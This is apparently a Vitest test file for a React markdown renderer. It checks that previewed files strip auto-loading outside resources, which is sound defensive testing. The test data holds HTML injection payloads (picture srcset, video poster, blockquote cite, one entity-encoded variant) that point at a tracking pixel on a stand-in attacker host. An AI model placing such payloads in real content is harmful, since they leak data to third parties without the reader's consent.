import React from 'react';
import { describe, it, expect, afterEach, vi } from 'vitest';
import { render, cleanup, waitFor } from '@testing-library/react';
import { Theme } from '@radix-ui/themes';
import { MarkdownRenderer } from '../markdown-renderer';

const PIXEL = 'https://attacker.example/p.gif?d=CNRY_R';

function serve(body: string) {
  vi.stubGlobal(
    'fetch',
    vi.fn(async () => new Response(body, { status: 200, headers: { 'Content-Type': 'text/markdown' } })),
  );
}

async function renderFile(body: string) {
  serve(body);
  const view = render(
    React.createElement(Theme, null, React.createElement(MarkdownRenderer, { fileUrl: '/file.md', fileName: 'file.md' })),
  );
  await waitFor(() => expect(view.container.textContent).toContain('After'));
  return view;
}

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
});

describe('MarkdownRenderer — a previewed file loads no outside image on its own', () => {
  it.each([
    `<picture><source srcset="${PIXEL}"><img src="/api/v1/knowledgeBase/stream/record/r1"></picture>`,
    '<picture><source srcset="https&#x3a;//attacker.example/p.gif&#x3f;d=CNRY_R"><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw="></picture>',
    `<video poster="${PIXEL}"></video>`,
    `<blockquote cite="${PIXEL}">q</blockquote>`,
  ])('keeps no outside URL for %s', async (html) => {
    const { container } = await renderFile(`Before\n\n${html}\n\nAfter`);
    expect(container.querySelector('picture, source, video')).toBeNull();
    expect(container.innerHTML).not.toContain('attacker.example');
  });

  it('still shows a third-party image as a click-to-load placeholder', async () => {
    const { container, getByTestId } = await renderFile(`Before\n\n![chart](${PIXEL})\n\nAfter`);
    expect(container.querySelector('img')).toBeNull();
    expect(getByTestId('remote-image-placeholder')).toBeTruthy();
  });
});
